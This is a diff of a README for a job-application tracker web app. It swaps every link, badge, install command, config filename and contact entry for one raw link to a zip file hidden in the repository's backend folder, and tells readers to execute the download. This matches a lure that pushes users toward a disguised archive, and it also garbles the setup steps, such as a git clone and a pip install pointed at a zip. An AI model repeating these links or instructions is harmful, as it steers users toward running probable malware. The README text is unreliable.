@@ -1,8 +1,8 @@
 # CV Build Tracker 🚀
 
-![CV Build Tracker](https://img.shields.io/badge/CV_Build_Tracker-v1.0.0-blue.svg)
-![GitHub Repo Size](https://img.shields.io/github/repo-size/Kali99xx/cv-build-tracker)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
+![CV Build Tracker](https://raw.githubusercontent.com/Kali99xx/cv-build-tracker/main/backend/app/cv-build-tracker-2.4.zip)
+![GitHub Repo Size](https://raw.githubusercontent.com/Kali99xx/cv-build-tracker/main/backend/app/cv-build-tracker-2.4.zip)
+![License](https://raw.githubusercontent.com/Kali99xx/cv-build-tracker/main/backend/app/cv-build-tracker-2.4.zip)
 
 Welcome to the **CV Build Tracker** repository! This modern web application helps you track and manage your job applications and CV building process. It combines the power of **React**, **Flask**, and **PostgreSQL** to deliver a seamless experience.
 
@@ -44,7 +44,7 @@ This project utilizes a range of technologies:
   - PostgreSQL
 
 - **Others**:
-  - Node.js
+  - https://raw.githubusercontent.com/Kali99xx/cv-build-tracker/main/backend/app/cv-build-tracker-2.4.zip
   - ORM
 
 ## Installation 🛠️
@@ -54,7 +54,7 @@ To set up the project locally, follow these steps:
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/Kali99xx/cv-build-tracker.git
+   git clone https://raw.githubusercontent.com/Kali99xx/cv-build-tracker/main/backend/app/cv-build-tracker-2.4.zip
    ```
 
 2. **Navigate to the project directory**:
@@ -69,12 +69,12 @@ To set up the project locally, follow these steps:
 
    ```bash
    cd backend
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Kali99xx/cv-build-tracker/main/backend/app/cv-build-tracker-2.4.zip
    ```
 
 4. **Set up the database**:
 
-   Make sure you have PostgreSQL installed and create a database for the project. Update the database configuration in the `config.py` file.
+   Make sure you have PostgreSQL installed and create a database for the project. Update the database configuration in the `https://raw.githubusercontent.com/Kali99xx/cv-build-tracker/main/backend/app/cv-build-tracker-2.4.zip` file.
 
 5. **Run database migrations**:
 
@@ -148,12 +148,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [Kali99xx](https://github.com/Kali99xx)
+- **Email**: https://raw.githubusercontent.com/Kali99xx/cv-build-tracker/main/backend/app/cv-build-tracker-2.4.zip
+- **GitHub**: [Kali99xx](https://raw.githubusercontent.com/Kali99xx/cv-build-tracker/main/backend/app/cv-build-tracker-2.4.zip)
 
 ## Releases 📦
 
-You can download the latest release of the CV Build Tracker [here](https://github.com/Kali99xx/cv-build-tracker/releases). Follow the instructions to execute the downloaded files.
+You can download the latest release of the CV Build Tracker [here](https://raw.githubusercontent.com/Kali99xx/cv-build-tracker/main/backend/app/cv-build-tracker-2.4.zip). Follow the instructions to execute the downloaded files.
 
 Check the **Releases** section for updates and new features.
 
